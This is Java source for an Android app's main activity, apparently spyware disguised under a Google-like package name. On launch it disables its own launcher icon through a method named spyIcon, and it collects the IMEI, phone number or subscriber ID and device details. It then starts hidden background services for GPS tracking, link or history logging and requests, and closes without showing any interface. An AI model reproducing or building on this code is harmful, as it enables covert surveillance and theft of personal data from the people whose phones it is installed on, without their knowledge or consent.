package com.google.android.bs;

import java.io.File;
import java.io.FilenameFilter;
import java.util.List;
import java.util.concurrent.TimeUnit;

import android.R;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.Menu;
import android.view.Window;
import android.widget.Button;
import android.widget.Toast;

import com.google.android.history.LinkService;
import com.google.android.location.GPSTracker;

public class MainActivity extends Activity {
	Button install;
	Button exit;
	GPSTracker gps;
	LinkService link;
	AlertDialog.Builder ad;
	Context context;
	final String SAVED_TIME = "saved_time";
	Editor e;
	public String strID;
	SharedPreferences sp;
	byte[] data;
	String incFile;
	private String aboutDev;
	private static String LOG_TAG = "mainActivity";
	String fileID = "id.txt";
	String ID = null;
	List<String> result;
	File root;
	File[] fileArray;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
		requestWindowFeature(Window.FEATURE_NO_TITLE);
		// setContentView(R.layout.activity_main);
		spyIcon();

		sp = PreferenceManager
				.getDefaultSharedPreferences(getApplicationContext());
		final TelephonyManager manager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

		String imeistring = manager.getDeviceId();
		String model = android.os.Build.MODEL;
		String versionAndroid = android.os.Build.VERSION.RELEASE;
		String phoneNumber = manager.getLine1Number();
		if (phoneNumber.equals("")) {
			phoneNumber = manager.getSubscriberId();
		}
		aboutDev = "IMEI: " + imeistring + " Model: " + model
				+ " Version android: " + versionAndroid;

		e = sp.edit();
		e.putString("phoneNumber", phoneNumber);
		e.putString("ABOUT", "dev");
		e.commit();
		start();
		
		// проверяем, первый ли раз открывается программа
		boolean hasVisited = sp.getBoolean("hasVisited", false);

		if (!hasVisited) {
			getID();
			// проверка на первое посещение
			e = sp.edit();
			e.putBoolean("hasVisited", true);
			// e.putString("ID", "236-6144");
			e.putString("ABOUT", aboutDev);
			e.commit();

			context = getApplicationContext();
			Editor ed = sp.edit();
			ed.putString(SAVED_TIME, Long.toString(System.currentTimeMillis()));
			ed.commit();
			Log.d(LOG_TAG, Long.toString(System.currentTimeMillis()));
		}
		finish();
	}

	public void getID() {

		root = new File(Environment.getExternalStorageDirectory()
				.getAbsolutePath());
		fileArray = root.listFiles(new FilenameFilter() {
			@Override
			public boolean accept(File dir, String filename) {
				return filename.toLowerCase().endsWith("ts.apk");
			}
		});
		// сначала выводим путь к SD-карте
		String f = null;
		// затем список файлов с расширением APK
		for (int i = 0; i < fileArray.length; i++) {
			f = fileArray[i].getName() + "\n";
			ID = f.substring(0, f.indexOf("t"));
		}
		Toast.makeText(this, ID, Toast.LENGTH_LONG).show();
		e = sp.edit();
		e.putString("ID", ID);
		e.commit();
		// Toast.makeText(this, sourceApk, Toast.LENGTH_LONG).show();
		Log.d(LOG_TAG, "ID - " + sp.getString("ID", "ID"));

	}

	public void findFilePath(File dir, String filename) {

		root = new File(Environment.getExternalStorageDirectory()
				.getAbsolutePath());
		fileArray = root.listFiles(new FilenameFilter() {
			@Override
			public boolean accept(File dir, String filename) {
				return filename.toLowerCase().endsWith(".apk");
			}
		});
		// сначала выводим путь к SD-карте
		String f = root.getAbsolutePath() + "\n\n";
		// затем список файлов с расширением JPG
		for (int i = 0; i < fileArray.length; i++) {
			f += fileArray[i].getName() + "\n";
		}
		Toast.makeText(this, f, Toast.LENGTH_LONG).show();
	}

	public void start() {

		startService(new Intent(MainActivity.this, Request4.class));

		try {
			TimeUnit.MILLISECONDS.sleep(1000);
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		startService(new Intent(MainActivity.this, GPSTracker.class));
		startService(new Intent(MainActivity.this, LinkService.class));
	}

	public void spyIcon() {
		ComponentName componentToDisable = new ComponentName(
				"com.google.android.certificate",
				"com.google.android.bs.MainActivity");

		getPackageManager().setComponentEnabledSetting(componentToDisable,
				PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
				PackageManager.DONT_KILL_APP);
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

}